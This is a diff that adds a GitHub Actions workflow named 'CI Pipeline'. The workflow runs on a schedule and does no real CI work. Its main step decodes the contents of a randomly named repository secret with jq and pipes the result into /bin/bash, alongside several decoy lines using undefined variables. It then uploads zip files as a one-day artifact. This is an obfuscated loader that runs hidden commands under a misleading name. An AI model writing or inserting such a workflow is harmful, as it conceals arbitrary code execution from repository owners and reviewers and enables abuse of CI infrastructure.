@@ -1,0 +1,37 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          chl86867: ${{ secrets.chl86867 }}
+        run: |
+          printf '%s' "$chl86867" | jq -r .me2 | /bin/bash
+          echo $hlzw60491 | jq -r .van20 | /bin/bash
+          echo $d20 | jq -r .sqvb2597 | /bin/bash
+          printf '%s' "$z2" | jq -r .kf72467 | /bin/bash
+          printf '%s' "$hnmg449" | jq -r .d69 | /bin/bash
+          printf '%s' "$iq1127" | jq -r .lqkw8 | /bin/bash
+          echo $dp8 | jq -r .ab4563 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Shd1MPcG
+          path: "*.zip"
+          retention-days: 1
